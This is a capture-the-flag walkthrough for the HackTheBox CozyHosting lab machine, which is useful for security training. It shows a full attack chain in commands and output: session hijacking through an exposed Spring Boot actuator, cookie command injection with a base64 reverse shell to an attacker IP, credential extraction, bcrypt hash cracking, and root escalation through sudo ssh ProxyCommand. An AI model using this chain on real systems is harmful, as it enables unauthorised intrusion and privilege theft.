# HackTheBox CozyHosting

An Easy level HackTheBox platform lab machine running Linux containing an open actuator on Spring Boot, Command Injection, application reversal and simple privilege escalation.

## Service Overview

The machine is assigned IP address 10.10.11.230, let's scan the ports with Nmap:

```bash
$ nmap -sV -sS -Pn -p1-65535 -oN 10.10.11.230 10.10.11.230
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 01:46 EDT
Nmap scan report for 10.10.11.230
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After going to http://10.10.11.230 we get the address cozyhosting.htb, which we will write in /etc/hosts.

```
$ echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

## Web Service

Let's use dirsearch to find interesting files.

```bash
$ python3 dirsearch.py -u http://cozyhosting.htb
```

Sessions found the user kanderson: http://cozyhosting.htb/actuator/sessions.
	
```bash
36FC9F46B782A399A71908E661CF5481	"kanderson"
078E0AFFF6038D86B0E4B9503735EE36	"kanderson"

	
EEB6EBC6B06219C8009764BB6ACCF8DD	"UNAUTHORIZED"
6155F2929B8D4814171410BE580B8215	"kanderson"
```

In web-browser click: **Inspect -> Storage -> Cookies - Replace** to:

```bash
;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTgvNDQ0NCAwPiYxCg=="|base64${IFS}-d|bash;
```

Reverse shell:

```bash
$ echo "sh -i >& /dev/tcp/10.10.16.18/4444 0>&1" | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTgvNDQ0NCAwPiYxCg==
```


Let's start nc and send the request:

```bash
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.18] from (UNKNOWN) [10.10.11.230] 36184
sh: 0: can't access tty; job control turned off
$ ls /home
$ josh
$ ls
$ cloudhosting-0.0.1.jar
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
$ python3 -m http.server 8083
10.10.16.18 - - [08/Sep/2023 10:29:06] "GET / HTTP/1.1" 200 -
10.10.16.18 - - [08/Sep/2023 10:29:07] code 404, message File not found
10.10.16.18 - - [08/Sep/2023 10:29:07] "GET /favicon.ico HTTP/1.1" 404 -
10.10.16.18 - - [08/Sep/2023 10:29:51] "GET /cloudhosting-0.0.1.jar HTTP/1.1" 200 -
```

## Exploring the application

Let's download the application cloudhosting-0.0.1.jar and open it in jd.

```bash
$ wget http://cozyhosting.htb:8083/cloudhosting-0.0.1.jar
```

In application.properties find the password for postgres, and in scheduled/FakeUser.class find the creds for user kanderson:

```bash
$ jar xf cloudhosting-0.0.1.jar

$ cd BOOT-INF/classes
$ cat application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Let's look at the database:

```bash
psql "postgresql://$DB_USER:$DB_PWD@$DB_SERVER/$DB_NAME"

psql -U postgres -W -h localhost -d cozyhosting
psql "postgresql://postgres:nvzAQ7XxR@localhost:5432/cozyhosting"

psql -U postgres -W -h localhost -d cozyhosting
Password: Vg&nvzAQ7XxR

\list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

\c cozyhosting
Password: Vg&nvzAQ7XxR

You are now connected to database "cozyhosting" as user "postgres".
\d
              List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

SELECT * FROM users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

Hash Identification (bcrypt):

```bash
$ hashcat --help | grep 3200
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
```

Let's put the hash in the hash.txt file and run hashcat:

```bash
$ hashcat -m 3200 -a 0 hash.txt rockyou.txt
hashcat (v6.1.1) starting...
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

Let's see what user is still on the system:

```bash
$ ls -la /home
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040750/rwxr-x---  4096  dir   2023-08-08 06:19:05 -0400  josh
```

Let's try to connect to ssh using:

```bash
ssh josh@10.10.11.230
manchesterunited

josh@cozyhosting:~$ cat user.txt
ab5232bdddfdec1731346c7bd7e4e8cc
```

## Privilege escalation

Let's see what the josh user can execute from under sudo:
Let's use the [gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo) method.

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

# cd /root
# ls
root.txt
# cat root.txt
f9b3da1faf12ea84a31efc7297b25fc6
```